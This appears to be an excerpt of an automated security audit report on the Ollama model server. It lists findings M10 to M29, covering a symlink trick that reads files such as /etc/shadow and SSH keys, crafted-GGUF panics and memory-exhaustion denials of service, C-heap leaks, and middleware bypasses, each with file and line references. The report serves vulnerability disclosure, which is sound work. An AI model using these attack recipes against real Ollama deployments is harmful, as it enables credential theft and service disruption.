### [M10] Create Safetensors Symlink Follow
- **Severity:** MEDIUM
- **Summary:** `x/create/create.go:CreateSafetensorsModel` reads a directory with `os.ReadDir` and opens every `.safetensors` and `.json` entry with `os.Open`. No symlink resolution is performed. An attacker who can place files in the target directory (or who controls what `modelDir` points to) can create symlinks that, when followed, read arbitrary files owned by the Ollama process user.
- **Impact:** Arbitrary file read. Because Ollama frequently runs as root via systemd on Linux, this typically means read access to `/etc/shadow`, `/root/.ssh/id_ed25519`, `/proc/1/environ`, TLS private keys, and cloud credentials. The contents are hashed and stored as a blob, then returned by `/api/show` and any subsequent `/api/pull` from the same registry.
- **Root Cause:** Validated rationale: CreateSafetensorsModel enumerates a user-supplied directory with os.ReadDir and opens each entry with os.Open (via safetensors.OpenForExtraction and direct JSON readers) without filepath.EvalSymlinks, filepath.IsLocal, or os.OpenRoot; symlinks are followed transparently, so model.safetensors -> /etc/shadow reads arbitrary files into the blob store.
- **Key Code Reference:** `x/create/create.go:695` -- `os.ReadDir(modelDir)`
- **PoC Status:** executed
- **Finding Reference:** Phase: 8; Sequence: 010; Slug: create-safetensors-symlink-follow; Verdict: VALID; Rationale: CreateSafetensorsModel enumerates a user-supplied directory with os.ReadDir and opens each entry with os.Open (via safetensors.OpenForExtraction and direct JSON readers) without f…; Severity-Original: HIGH; PoC-Status: executed; Pre-FP-Flag: none
- **Detailed Report:** archon/findings/M10-create-safetensors-symlink-follow/report.md
- **Proof of Concept:** missing
- **Evidence:** archon/findings/M10-create-safetensors-symlink-follow/evidence/

### [M11] Graphsize Nil Type Assertion
- **Severity:** MEDIUM
- **Summary:** `fs/ggml/ggml.go:607` reads vocab size as `uint64(f.KV()["tokenizer.ggml.tokens"].(*array[string]).size)`. The map read returns `nil` if the key is absent, or a differently-typed value if the GGUF declares `tokenizer.ggml.tokens` as (for example) a scalar uint64 rather than an array of strings. In either case the type assertion panics with "interface conversion: interface is nil, not *array[string]" or "interface is uint64, not *array[string]".
- **Impact:** HTTP path: gin.Recovery catches -> per-request 500 DoS. Every `/api/chat` that needs VRAM estimation on the poisoned model fails.
- **Root Cause:** Validated rationale: fs/ggml/ggml.go:607 performs an unchecked type assertion on f.KV()["tokenizer.ggml.tokens"] without nil or ok-check; a GGUF missing that key or where the value is not a *array[string] panics the caller. Recovery middleware catches the HTTP path but background scheduler goroutines are unprotected.
- **Key Code Reference:** `fs/ggml/ggml.go:607` in `GraphSize`.
- **PoC Status:** pending
- **Finding Reference:** Phase: 8; Sequence: 011; Slug: graphsize-nil-type-assertion; Verdict: VALID; Rationale: fs/ggml/ggml.go:607 performs an unchecked type assertion on f.KV()["tokenizer.ggml.tokens"] without nil or ok-check; a GGUF missing that key or where the value is not a *array[str…; Severity-Original: MEDIUM; PoC-Status: pending; Pre-FP-Flag: none
- **Detailed Report:** archon/findings/M11-graphsize-nil-type-assertion/report.md
- **Proof of Concept:** missing
- **Evidence:** archon/findings/M11-graphsize-nil-type-assertion/evidence/

### [M12] GGUF Alignment Zero Divide By Zero
- **Severity:** MEDIUM
- **Summary:** `fs/ggml/gguf.go:687-689` implements `ggufPadding(offset, align int64) int64 { return (align - offset%align) % align }` with no guard against `align == 0`. `fs/ggml/gguf.go:238` reads alignment as `llm.kv.Uint("general.alignment", 32)` -- the default 32 only applies when the key is ABSENT; if the attacker declares `general.alignment = 0`, `Uint` returns 0 and the subsequent `ggufPadding(offset, int64(alignment))` at line 245, 573, and 580 panics with "integer divide by zero".
- **Impact:** HTTP path: gin.Recovery catches -> 500 per request. `/api/show` on the poisoned blob always fails.
- **Root Cause:** Validated rationale: ggufPadding(offset, align) computes (align - offset%align) % align with no validation that align != 0; kv.Uint("general.alignment", 32) returns 0 when the attacker sets the key to 0 (default fires only on missing key); reached from Decode during any parse, and from fixBlobs during GC so a poisoned blob survives delete attempts.
- **Key Code Reference:** `fs/ggml/gguf.go:687-689` -- `ggufPadding` without zero-check
- **PoC Status:** executed
- **Finding Reference:** Phase: 8; Sequence: 012; Slug: gguf-alignment-zero-divide-by-zero; Verdict: VALID; Rationale: ggufPadding(offset, align) computes (align - offset%align) % align with no validation that align != 0; kv.Uint("general.alignment", 32) returns 0 when the attacker sets the key to…; Severity-Original: HIGH; PoC-Status: executed; Pre-FP-Flag: none
- **Detailed Report:** archon/findings/M12-gguf-alignment-zero-divide-by-zero/report.md
- **Proof of Concept:** missing
- **Evidence:** archon/findings/M12-gguf-alignment-zero-divide-by-zero/evidence/

### [M13] GGUF V1 String Truncate Panic
- **Severity:** MEDIUM
- **Summary:** `fs/ggml/gguf.go:296-311 readGGUFV1String` reads a uint64 length, then copies exactly `int64(length)` bytes via `io.CopyN`, then truncates the trailing null terminator with `b.Truncate(b.Len() - 1)`. For `length >= 2^63`, `int64(length)` wraps to a negative value. `io.CopyN` with negative n returns `(0, nil)` (per stdlib behavior). The buffer is then empty (`b.Len() == 0`), and `Truncate(-1)` panics with "bytes.Buffer: truncation out of range".
- **Impact:** Recoverable panic -> per-request 500 when reached from HTTP handler. V1 rarity narrows blast radius but does not prevent the attack since the attacker chooses the format.
- **Root Cause:** Validated rationale: readGGUFV1String reads a uint64 length, casts to int64 for io.CopyN (which treats negative as zero-read), then unconditionally calls b.Truncate(b.Len()-1); for a zero-read buffer this is Truncate(-1) which panics. Affects V1 legacy GGUFs.
- **Key Code Reference:** `fs/ggml/gguf.go:296-311`
- **PoC Status:** pending
- **Finding Reference:** Phase: 8; Sequence: 013; Slug: gguf-v1-string-truncate-panic; Verdict: VALID; Rationale: readGGUFV1String reads a uint64 length, casts to int64 for io.CopyN (which treats negative as zero-read), then unconditionally calls b.Truncate(b.Len()-1); for a zero-read buffer…; Severity-Original: MEDIUM; PoC-Status: pending; Pre-FP-Flag: none
- **Detailed Report:** archon/findings/M13-gguf-v1-string-truncate-panic/report.md
- **Proof of Concept:** missing
- **Evidence:** archon/findings/M13-gguf-v1-string-truncate-panic/evidence/

### [M14] GGUF Numkv Unbounded
- **Severity:** MEDIUM
- **Summary:** `fs/ggml/gguf.go:143` runs `for i := 0; uint64(i) < llm.numKV(); i++` with no cap. Each iteration reads a KV key (via `readGGUFString`, p8-021 applies) and a typed value, then stores the pair in `llm.kv map[string]any`. For a 1GB input with minimum-size KV entries (~14 bytes each), numKV can reach ~7×10^7 entries, each requiring a map allocation plus the key string's heap footprint.
- **Impact:** CPU + memory DoS, structurally bounded by file-size. Combined with p8-021 (unbounded string alloc per iteration) the memory growth per byte of input is high. Same class as p8-023 (numTensor uncapped loop).
- **Root Cause:** Validated rationale: The KV header loop at fs/ggml/gguf.go:143 iterates numKV times with no cap; each iteration allocates a map entry and triggers readGGUFString's unbounded alloc (see p8-021); combined with numTensor loop, these form an uncapped-loop cluster that consumes memory proportional to attacker declarations until file EOF or OOM.
- **Key Code Reference:** `fs/ggml/gguf.go:141-191`
- **PoC Status:** pending
- **Finding Reference:** Phase: 8; Sequence: 014; Slug: gguf-numkv-unbounded; Verdict: VALID; Rationale: The KV header loop at fs/ggml/gguf.go:143 iterates numKV times with no cap; each iteration allocates a map entry and triggers readGGUFString's unbounded alloc (see p8-021); combin…; Severity-Original: MEDIUM; PoC-Status: pending; Pre-FP-Flag: none
- **Detailed Report:** archon/findings/M14-gguf-numkv-unbounded/report.md
- **Proof of Concept:** missing
- **Evidence:** archon/findings/M14-gguf-numkv-unbounded/evidence/

### [M15] Wordpiece Rune Amplification
- **Severity:** MEDIUM
- **Summary:** `tokenizer/wordpiece.go:59-76` pre-allocates a rune slice with capacity `len(s)*3` to accommodate worst-case CJK-character padding. Since `rune` is `int32` (4 bytes), the memory cost is 12 bytes per input byte (3 runes × 4 bytes). The SAST flag (`codeql-go/allocation-size-overflow-tokenizer/wordpiece.go-61`) is a false positive for overflow (requires `len(s) > MaxInt/3`, impossible) but the underlying amplification IS a real memory-pressure vector.
- **Impact:** 12× RAM amplification of attacker input. 500MB POST -> 6GB transient allocation inside the tokenizer. Sustained low-RPS attacks can exhaust process memory without ever triggering an explicit OOM check.
- **Root Cause:** Validated rationale: tokenizer/wordpiece.go:61 pre-allocates make([]rune, 0, len(s)*3) where each rune is int32 (4 bytes); a 500MB input produces a 6GB capacity allocation. The multiplication cannot overflow int on 64-bit, but the 12× (3 runes × 4 bytes) amplification is a real DoS vector when /api/tokenize or /api/generate body size is not capped.
- **Key Code Reference:** `tokenizer/wordpiece.go:61`
- **PoC Status:** pending
- **Finding Reference:** Phase: 8; Sequence: 015; Slug: wordpiece-rune-amplification; Verdict: VALID; Rationale: tokenizer/wordpiece.go:61 pre-allocates make([]rune, 0, len(s)*3) where each rune is int32 (4 bytes); a 500MB input produces a 6GB capacity allocation. The multiplication cannot o…; Severity-Original: MEDIUM; PoC-Status: pending; Pre-FP-Flag: none
- **Detailed Report:** archon/findings/M15-wordpiece-rune-amplification/report.md
- **Proof of Concept:** missing
- **Evidence:** archon/findings/M15-wordpiece-rune-amplification/evidence/

### [M16] Tokenizer Vocab Size Mismatch
- **Severity:** MEDIUM
- **Summary:** The Ollama Go loader treats `tokenizer.ggml.tokens` (an array of strings) as the authoritative source of vocabulary size at `fs/ggml/ggml.go:607`. cgo-side llama.cpp uses a separate `n_vocab` value derived from the model architecture. There is NO cross-check in the Go model-load path that validates `len(tokenizer.ggml.tokens) == n_vocab` or constrains the Go-side tokenizer to emit only IDs in `[0, n_vocab)`.
- **Impact:** Potential OOB read in cgo embedding lookup, memory-disclosure oracle for adjacent mmapped weights. Cgo-side exploitation is speculative without llama.cpp source review; this finding captures the Go-side defect (missing invariant check) rather than the cgo-side consequence.
- **Root Cause:** Validated rationale: The Go loader derives vocab size from len(tokenizer.ggml.tokens) in fs/ggml/ggml.go:607 but does not cross-check it against the model's declared n_vocab; cgo embedding matmul sizes its embedding table from n_vocab. When the two disagree, token IDs produced by the Go tokenizer can exceed the cgo embedding table bounds.
- **Key Code Reference:** `fs/ggml/ggml.go:607` -- vocab = len of tokens array
- **PoC Status:** pending
- **Finding Reference:** Phase: 8; Sequence: 016; Slug: tokenizer-vocab-size-mismatch; Verdict: VALID; Rationale: The Go loader derives vocab size from len(tokenizer.ggml.tokens) in fs/ggml/ggml.go:607 but does not cross-check it against the model's declared n_vocab; cgo embedding matmul size…; Severity-Original: MEDIUM; PoC-Status: pending; Pre-FP-Flag: none
- **Detailed Report:** archon/findings/M16-tokenizer-vocab-size-mismatch/report.md
- **Proof of Concept:** missing
- **Evidence:** archon/findings/M16-tokenizer-vocab-size-mismatch/evidence/

### [M17] GGUF String Int Cast Panic DoS
- **Severity:** MEDIUM
- **Summary:** `fs/ggml/gguf.go:354-363` (GGUF V2+ string read) does:
- **Impact:** Request-scoped DoS. Each malicious request consumes the parse-side I/O and CPU until the panic point. The process recovers, but concurrent legitimate `/api/create` requests serialized on shared GGUF parser state may stall. The DoS can be chained with p8-042 (runner OOM) or p8-040 (runner SIGSEGV) for a multi-surface denial.
- **Root Cause:** Validated rationale: Tracer confirmed `fs/ggml/gguf.go:354-363` reads a `uint64` length and casts to `int`, wrapping negative for values > MaxInt64 — `llm.scratch[:negative_length]` panics with "slice bounds out of range", and for values in (16384, MaxInt64] the subsequent `make([]byte, length)` panics with "len out of range"; gin recovers each to HTTP 500 so the finding is bounded to request-scope DoS, but the broader integer-cast-at-cgo-boundary pattern is a known class warranting disclosure.
- **Key Code Reference:** `fs/ggml/gguf.go:354-363` -- V2+ string length read; `int(uint64)` cast without validation
- **PoC Status:** pending
- **Finding Reference:** Phase: 8; Sequence: 017; Slug: gguf-string-int-cast-panic-dos; Verdict: VALID; Rationale: Tracer confirmed `fs/ggml/gguf.go:354-363` reads a `uint64` length and casts to `int`, wrapping negative for values > MaxInt64 — `llm.scratch[:negative_length]` panics with "slice…; Severity-Original: MEDIUM; PoC-Status: pending; Pre-FP-Flag: none
- **Detailed Report:** archon/findings/M17-gguf-string-int-cast-panic-dos/report.md
- **Proof of Concept:** missing
- **Evidence:** archon/findings/M17-gguf-string-int-cast-panic-dos/evidence/

### [M18] Embeddings Seq Unsafe Slice Nembd
- **Severity:** MEDIUM
- **Summary:** `llama/llama.go:211-243` (`GetEmbeddingsSeq`, `GetEmbeddingsIth`, `GetLogitsIth`) construct per-request result buffers sized by `c.Model().NEmbd()`, which returns `C.llama_model_n_embd(m.c)` — derived from the GGUF `llama.embedding_length` metadata. No upstream validation bounds this value. For a crafted model with `embedding_length = 2^31-1`:
- **Impact:** Runner OOM on unauthenticated `/api/embed`. Scheduler-wide impact: all active sessions on the model drop. The DoS persists as long as the crafted model is the `/api/embed` target. The parent daemon continues running; only the runner crashes.
- **Root Cause:** Validated rationale: Tracer confirmed `llama/llama.go:217-218` uses `make([]float32, c.Model().NEmbd())` + `unsafe.Slice(..., NEmbd())` where `NEmbd()` flows from the model's GGUF `llama.embedding_length` KV with no upstream bound; a crafted model with `embedding_length = 2^31-1` triggers an 8 GB allocation in the runner subprocess on `/api/embed` calls — not direct memory disclosure (advocate's C-and-Go-share-n_embd argument is valid for the read range) but a reliable unauthenticated DoS, and the dual-read at lines 217-218 creates a small TOCTOU window worth hardening.
- **Key Code Reference:** `llama/llama.go:217-218` -- `embeddings := make([]float32, c.Model().NEmbd())` then `copy(embeddings, unsafe.Slice(..., c.Model().NEmbd()))` — dual NEmbd() read
- **PoC Status:** pending
- **Finding Reference:** Phase: 8; Sequence: 018; Slug: embeddings-seq-unsafe-slice-nembd; Verdict: VALID; Rationale: Tracer confirmed `llama/llama.go:217-218` uses `make([]float32, c.Model().NEmbd())` + `unsafe.Slice(..., NEmbd())` where `NEmbd()` flows from the model's GGUF `llama.embedding_len…; Severity-Original: MEDIUM; PoC-Status: pending; Pre-FP-Flag: none
- **Detailed Report:** archon/findings/M18-embeddings-seq-unsafe-slice-nembd/report.md
- **Proof of Concept:** missing
- **Evidence:** archon/findings/M18-embeddings-seq-unsafe-slice-nembd/evidence/

### [M19] MLXRunner Manifest Path Traversal Defense In Depth
- **Severity:** MEDIUM
- **Summary:** `x/imagegen/manifest/manifest.go:71-97` (`resolveManifestPath`) and its twin in `x/create/create.go:51-74` take a model name, split on `/`, and join with `DefaultManifestDir()`. No `filepath.IsLocal` check is applied at these functions. They rely on the parent daemon having already validated the name via `model.ParseName` + `isValidPart` before the name reaches them.
- **Impact:** If the upstream gate fails (or a new caller bypasses it): manifest path traversal to read arbitrary files under the Ollama process user, scoped to files named `manifest.json` or the specific manifest filename pattern. Related to chamber-01 AP-001R (blob-path traversal). The MEDIUM severity reflects that this is NOT currently exploitable but is a latent hardening gap of a known-fragile pattern.
- **Root Cause:** Validated rationale: Tracer confirmed `x/imagegen/manifest/manifest.go:71-97` and `x/create/create.go:51-74` lack `filepath.IsLocal` / `filepath.Clean`+abs-path checks; current defense relies entirely on upstream `isValidPart` in the parent daemon's `model.ParseName`; a regression in that single gate or any new direct caller exposes path traversal — chamber-01 documents the sibling pattern under AP-001R, so this finding represents the defense-in-depth gap in the mlxrunner component specifically.
- **Key Code Reference:** `x/imagegen/manifest/manifest.go:71-97` -- `resolveManifestPath(modelName)` — no `filepath.IsLocal`
- **PoC Status:** pending
- **Finding Reference:** Phase: 8; Sequence: 019; Slug: mlxrunner-manifest-path-traversal-defense-in-depth; Verdict: VALID; Rationale: Tracer confirmed `x/imagegen/manifest/manifest.go:71-97` and `x/create/create.go:51-74` lack `filepath.IsLocal` / `filepath.Clean`+abs-path checks; current defense relies entirely…; Severity-Original: MEDIUM; PoC-Status: pending; Pre-FP-Flag: none
- **Detailed Report:** archon/findings/M19-mlxrunner-manifest-path-traversal-defense-in-depth/report.md
- **Proof of Concept:** missing
- **Evidence:** archon/findings/M19-mlxrunner-manifest-path-traversal-defense-in-depth/evidence/

### [M20] Lora Path IPC To cgo Passthrough
- **Severity:** MEDIUM
- **Summary:** The llamarunner subprocess applies LoRA adapters by iterating `req.LoraPath` (from the IPC `/load` request) and calling `C.llama_adapter_lora_init(m.c, cLoraPath)` for each entry. Each path flows unchanged to llama.cpp's adapter loader, which calls `gguf_init_from_file(path_lora)` and performs the full GGUF parse on the pointed-to file.
- **Impact:** Integer overflow in GGUF shape/offset fields (p8-020, p8-043) — same primitives apply to the adapter parser.
- **Root Cause:** Validated rationale: Tracer confirmed `runner/llamarunner/runner.go:852-856` iterates `req.LoraPath` and calls `llama/llama.go:348` → `C.llama_adapter_lora_init(path)` on every element; path is parent-daemon-controlled (blobs dir) so attacker control requires supply-chain (malicious registry) or IPC impersonation (p8-chain-B unreachable in practice); cgo parse of arbitrary GGUF-shaped file is the attack surface — finding is MEDIUM because the LoRA GGUF parser is a distinct attack surface from the main model parser.
- **Key Code Reference:** `runner/llamarunner/runner.go:852-856` -- loop over `lpath`; calls `ApplyLoraFromFile`
- **PoC Status:** pending
- **Finding Reference:** Phase: 8; Sequence: 020; Slug: lora-path-ipc-to-cgo-passthrough; Verdict: VALID; Rationale: Tracer confirmed `runner/llamarunner/runner.go:852-856` iterates `req.LoraPath` and calls `llama/llama.go:348` → `C.llama_adapter_lora_init(path)` on every element; path is parent…; Severity-Original: MEDIUM; PoC-Status: pending; Pre-FP-Flag: none
- **Detailed Report:** archon/findings/M20-lora-path-ipc-to-cgo-passthrough/report.md
- **Proof of Concept:** missing
- **Evidence:** archon/findings/M20-lora-path-ipc-to-cgo-passthrough/evidence/

### [M21] Cstring Leak Load Model From File
- **Severity:** MEDIUM
- **Summary:** `llama/llama.go:264-310` (`LoadModelFromFile`) calls `C.CString(modelPath)` at approximately line 308 without a corresponding `defer C.free(unsafe.Pointer(cPath))`. In Go's cgo model, the C heap is not reachable from the Go GC; the leaked CString persists until process exit.
- **Impact:** Per runner subprocess: 1 × CString leak = strlen(modelPath) + 1 bytes; trivial.
- **Root Cause:** Validated rationale: Tracer confirmed `llama/llama.go:308` calls `C.CString(modelPath)` with no `defer C.free` — the allocation is permanently leaked to the C heap; advocate correctly noted subprocess isolation bounds the leak per runner process and the "model already loaded" guard at `runner/llamarunner/runner.go:884-887` prevents re-trigger within one subprocess, so the finding is MEDIUM defense-in-depth rather than a DoS primitive.
- **Key Code Reference:** `llama/llama.go:308` (approximately — exact line per tracer trace) -- `cPath := C.CString(modelPath)` with no matching `defer C.free`
- **PoC Status:** pending
- **Finding Reference:** Phase: 8; Sequence: 021; Slug: cstring-leak-load-model-from-file; Verdict: VALID; Rationale: Tracer confirmed `llama/llama.go:308` calls `C.CString(modelPath)` with no `defer C.free` — the allocation is permanently leaked to the C heap; advocate correctly noted subprocess…; Severity-Original: MEDIUM; PoC-Status: pending; Pre-FP-Flag: none
- **Detailed Report:** archon/findings/M21-cstring-leak-load-model-from-file/report.md
- **Proof of Concept:** missing
- **Evidence:** archon/findings/M21-cstring-leak-load-model-from-file/evidence/

### [M22] Audio Mel Path Uncapped API Generate
- **Severity:** MEDIUM
- **Summary:** Ollama exposes two audio input paths: 1. **`POST /v1/audio/transcriptions`** (openai-compat): multipart upload; `middleware/openai.go:729` uses `ParseMultipartForm(25 << 20)` = 25 MB cap. Sample count bounded to ~6.5 M — safely below int32 overflow. 2. **`POST /api/generate`** / **`POST /api/chat`** with `"images":["<base64-audio>"]`: gemma-audio and qwen-audio models accept WAV/RIFF bytes through the multimodal image field. No MaxBytesReader. No size cap. Bytes flow through `runner/llamarunner/image.go:64-66` (zero-length guard only) and into `C.mtmd_helper_bitmap_init_from_buf`, which dispatches to the audio branch on RIFF/WAVE magic.
- **Impact:** **Confirmed**: unauthenticated DoS via RAM exhaustion — a 4GB POST body forces the runner to hold 4GB in RAM before any mel processing.
- **Root Cause:** Validated rationale: Tracer confirmed the `/v1/audio/transcriptions` entry has a 25 MB multipart cap at `middleware/openai.go:729` that constrains mel-compute sample count below int32 overflow, but the alternate `/api/generate` audio-as-images entry has no such cap — audio bytes flow through the same mtmd path with only the zero-length guard, so a multi-GB audio payload reaches the vendored mel-spectrogram code whose internal int32 sample-count arithmetic is not verified at code level.
- **Key Code Reference:** `middleware/openai.go:729` -- 25 MB cap on `/v1/audio/transcriptions` (the *safe* path)
- **PoC Status:** pending
- **Finding Reference:** Phase: 8; Sequence: 022; Slug: audio-mel-path-uncapped-api-generate; Verdict: VALID; Rationale: Tracer confirmed the `/v1/audio/transcriptions` entry has a 25 MB multipart cap at `middleware/openai.go:729` that constrains mel-compute sample count below int32 overflow, but th…; Severity-Original: MEDIUM; PoC-Status: pending; Pre-FP-Flag: none
- **Detailed Report:** archon/findings/M22-audio-mel-path-uncapped-api-generate/report.md
- **Proof of Concept:** missing
- **Evidence:** archon/findings/M22-audio-mel-path-uncapped-api-generate/evidence/

### [M23] Llama Adapter Lora Struct Leak
- **Severity:** MEDIUM
- **Summary:** `llama/llama.go:344-356` (`ApplyLoraFromFile`) calls `C.llama_adapter_lora_init(m.c, cLoraPath)` to allocate a `llama_adapter_lora` struct on the C heap, then calls `C.llama_set_adapter_lora(lc.c, loraAdapter, scale)` to register it with the context. There is NO matching `C.llama_adapter_lora_free(loraAdapter)` — neither deferred nor tracked — so each call permanently leaks the adapter struct.
- **Impact:** Per subprocess: leak grows linearly with adapter count. `llama_adapter_lora` struct is non-trivial (contains vectors of tensor pointers, names, etc.) — typically on the order of kilobytes per adapter.
- **Root Cause:** Validated rationale: Tracer confirmed that although `llama/llama.go:346` correctly frees the `cLoraPath` CString via defer, there is NO corresponding free for the `llama_adapter_lora` C struct returned by `C.llama_adapter_lora_init` — each `ApplyLoraFromFile` leaks one adapter struct; with no cap on `len(req.LoraPath)`, a crafted manifest with many adapter layers amplifies the leak; the leak is bounded per subprocess lifetime but represents a confirmed C-heap growth primitive.
- **Key Code Reference:** `llama/llama.go:348-355` -- `loraAdapter := C.llama_adapter_lora_init(m.c, cLoraPath)`; `C.llama_set_adapter_lora(lc.c, loraAdapter, scale)`; **no `defer C.llama_adapter_lora_free(loraAdapter)`**
- **PoC Status:** pending
- **Finding Reference:** Phase: 8; Sequence: 023; Slug: llama-adapter-lora-struct-leak; Verdict: VALID; Rationale: Tracer confirmed that although `llama/llama.go:346` correctly frees the `cLoraPath` CString via defer, there is NO corresponding free for the `llama_adapter_lora` C struct returne…; Severity-Original: MEDIUM; PoC-Status: pending; Pre-FP-Flag: none
- **Detailed Report:** archon/findings/M23-llama-adapter-lora-struct-leak/report.md
- **Proof of Concept:** missing
- **Evidence:** archon/findings/M23-llama-adapter-lora-struct-leak/evidence/

### [M24] Streaming Response Clean Eof Silent Truncation
- **Severity:** MEDIUM
- **Summary:** The ollama NDJSON streaming protocol for `/api/generate` and `/api/chat` emits one JSON object per line and ends with `{"done":true,"done_reason":"stop"}`. If the runner subprocess crashes mid-stream, the parent daemon's behavior depends on whether the HTTP connection terminates mid-chunk or at a clean newline boundary.
- **Impact:** A summarization agent whose final token determines an action (approve/deny, route-to-human/auto-process) has that token truncated.
- **Root Cause:** Validated rationale: Tracer disproved the original H-NEW-49 claim that the server falsely emits `done_reason:stop` on crash (server actually emits an error JSON line in the NDJSON stream); BUT confirmed a real variant — when `bufio.Scanner` sees a clean EOF boundary (runner crashes exactly at a newline), `scanner.Err()` returns nil and `Completion` returns nil, so the stream closes without any error object and without a final `done:true` chunk, which agentic clients that tolerate missing `done` may interpret as a complete response.
- **Key Code Reference:** `llm/server.go:1619-1626` -- `http.DefaultClient.Do(serverReq)` opens streaming connection to runner
- **PoC Status:** pending
- **Finding Reference:** Phase: 8; Sequence: 024; Slug: streaming-response-clean-eof-silent-truncation; Verdict: VALID; Rationale: Tracer disproved the original H-NEW-49 claim that the server falsely emits `done_reason:stop` on crash (server actually emits an error JSON line in the NDJSON stream); BUT confirm…; Severity-Original: MEDIUM; PoC-Status: pending; Pre-FP-Flag: none
- **Detailed Report:** archon/findings/M24-streaming-response-clean-eof-silent-truncation/report.md
- **Proof of Concept:** missing
- **Evidence:** archon/findings/M24-streaming-response-clean-eof-silent-truncation/evidence/

### [M25] cgo Log Callback Reentrancy Deadlock Latent
- **Severity:** MEDIUM
- **Summary:** `llama/llama.go:34-56` registers a Go function as the llama.cpp log callback via `C.llama_log_set`. When llama.cpp emits a log line during `C.llama_decode` (or any other cgo call), the C code synchronously invokes the Go callback while the cgo goroutine's OS thread (M) is in a C call and llama.cpp's internal mutex may be held.
- **Impact:** Today: none.
- **Root Cause:** Validated rationale: Tracer confirmed the cgo callback architecture at `llama/llama.go:34-56` registers a Go function as `C.llama_log_set` callback; the function path traverses `slog` which uses its own disjoint mutex, so current code does NOT exhibit deadlock — but the pattern (Go-code-callback-from-C-while-C-holds-mutex) is a known foot-gun class; a future caller that acquires a runner mutex inside the log callback creates a circular-wait with any goroutine waiting on `C.llama_decode`.
- **Key Code Reference:** `llama/llama.go:34-56` -- `SetLogCallback(fn)` registers the exported Go function via `C.llama_log_set`
- **PoC Status:** pending
- **Finding Reference:** Phase: 8; Sequence: 025; Slug: cgo-log-callback-reentrancy-deadlock-latent; Verdict: VALID; Rationale: Tracer confirmed the cgo callback architecture at `llama/llama.go:34-56` registers a Go function as `C.llama_log_set` callback; the function path traverses `slog` which uses its o…; Severity-Original: MEDIUM; PoC-Status: pending; Pre-FP-Flag: none
- **Detailed Report:** archon/findings/M25-cgo-log-callback-reentrancy-deadlock-latent/report.md
- **Proof of Concept:** missing
- **Evidence:** archon/findings/M25-cgo-log-callback-reentrancy-deadlock-latent/evidence/

### [M26] Ollama Host Nonloopback Shortcircuits Allowedhosts
- **Severity:** MEDIUM
- **Summary:** The `allowedHostsMiddleware` in `server/routes.go:1608-1644` implements a host-header + DNS-rebinding filter (the documented response to CVE-2024-28224). At line 1615, it performs a short-circuit test:
- **Impact:** Unauthenticated LAN access to:
- **Root Cause:** Validated rationale: `server/routes.go:1615-1618` short-circuits `allowedHostsMiddleware` whenever `addr.Addr().IsLoopback()` is false — so `OLLAMA_HOST=0.0.0.0` (the documented way to expose Ollama on a LAN) disables the entire DNS-rebinding + host-header filter while CORS and auth remain the only guards. Advocate argues this is intended-by-docs and CORS still blocks browser drive-by, but the net effect on non-browser LAN attackers (curl, Electron, extensions, VSCode webview) is a permanent unauthenticated surface to `/api/me`, `/api/pull`, `/api/experimental/web_{search,fetch}`, `/api/generate` et al.
- **Key Code Reference:** `server/routes.go:1608-1644` — `allowedHostsMiddleware`
- **PoC Status:** executed
- **Finding Reference:** Phase: 8; Sequence: 026; Slug: ollama-host-nonloopback-shortcircuits-allowedhosts; Verdict: VALID; Rationale: `server/routes.go:1615-1618` short-circuits `allowedHostsMiddleware` whenever `addr.Addr().IsLoopback()` is false — so `OLLAMA_HOST=0.0.0.0` (the documented way to expose Ollama o…; Severity-Original: HIGH; PoC-Status: executed; Pre-FP-Flag: none
- **Detailed Report:** archon/findings/M26-ollama-host-nonloopback-shortcircuits-allowedhosts/report.md
- **Proof of Concept:** missing
- **Evidence:** archon/findings/M26-ollama-host-nonloopback-shortcircuits-allowedhosts/evidence/

### [M27] Client2 Experiment Bypasses Middleware
- **Severity:** MEDIUM
- **Summary:** When `OLLAMA_EXPERIMENT=client2` is set:
- **Impact:** `/api/pull` SSRF reach (link-local IMDS, private networks, arbitrary hosts per finding p8-002) WITHOUT the Host-header filter that normally provides DNS-rebinding defense on loopback bind.
- **Root Cause:** Validated rationale: `server/internal/registry/server.go:109-128` dispatches `/api/pull` and `/api/delete` directly in its outer `ServeHTTP` when `OLLAMA_EXPERIMENT=client2` is set — skipping gin entirely, so `allowedHostsMiddleware`, cors, and every other middleware never runs on those routes; Advocate confirms the flag is documented-off but undocumented as security-relevant. Distinct from p8-008 (which covers unbounded body on the same path) because this is the host-header / auth-middleware bypass, not the body-size issue.
- **Key Code Reference:** `server/routes.go:92-96` — `useClient2` initialization from env
- **PoC Status:** executed
- **Finding Reference:** Phase: 8; Sequence: 027; Slug: client2-experiment-bypasses-middleware; Verdict: VALID; Rationale: `server/internal/registry/server.go:109-128` dispatches `/api/pull` and `/api/delete` directly in its outer `ServeHTTP` when `OLLAMA_EXPERIMENT=client2` is set — skipping gin enti…; Severity-Original: HIGH; PoC-Status: executed; Pre-FP-Flag: none
- **Detailed Report:** archon/findings/M27-client2-experiment-bypasses-middleware/report.md
- **Proof of Concept:** missing
- **Evidence:** archon/findings/M27-client2-experiment-bypasses-middleware/evidence/

### [M28] Readrequestbody Unbounded Cloud Proxy
- **Severity:** MEDIUM
- **Summary:** `readRequestBody` at `server/cloud_proxy.go:289-300`:
- **Impact:** Single-request OOM DoS against the Ollama daemon; inference sessions dropped.
- **Root Cause:** Validated rationale: `server/cloud_proxy.go:289-300` calls `io.ReadAll(r.Body)` with no size limit on every non-zstd cloud-passthrough request — `/v1/chat/completions`, `/v1/completions`, `/v1/responses`, `/v1/messages`, `/api/experimental/web_search`, `/api/experimental/web_fetch` — while the zstd branch has a 20 MiB cap (line 35). Advocate confirms no other MaxBytesReader in the chain and concedes real remote-DoS when chained with 0.0.0.0 bind or any allowedHosts bypass.
- **Key Code Reference:** `server/cloud_proxy.go:289-300` — `readRequestBody` with unbounded `io.ReadAll`
- **PoC Status:** executed
- **Finding Reference:** Phase: 8; Sequence: 028; Slug: readrequestbody-unbounded-cloud-proxy; Verdict: VALID; Rationale: `server/cloud_proxy.go:289-300` calls `io.ReadAll(r.Body)` with no size limit on every non-zstd cloud-passthrough request — `/v1/chat/completions`, `/v1/completions`, `/v1/respons…; Severity-Original: HIGH; PoC-Status: executed; Pre-FP-Flag: none
- **Detailed Report:** archon/findings/M28-readrequestbody-unbounded-cloud-proxy/report.md
- **Proof of Concept:** missing
- **Evidence:** archon/findings/M28-readrequestbody-unbounded-cloud-proxy/evidence/

### [M29] Web Search Fetch Unauth Signing Oracle
- **Severity:** MEDIUM
- **Summary:** Two gin-registered routes relay attacker-controlled queries to ollama.com signed with the victim's identity:
- **Impact:** Free use of the victim's ollama.com cloud resources (billed to the victim).
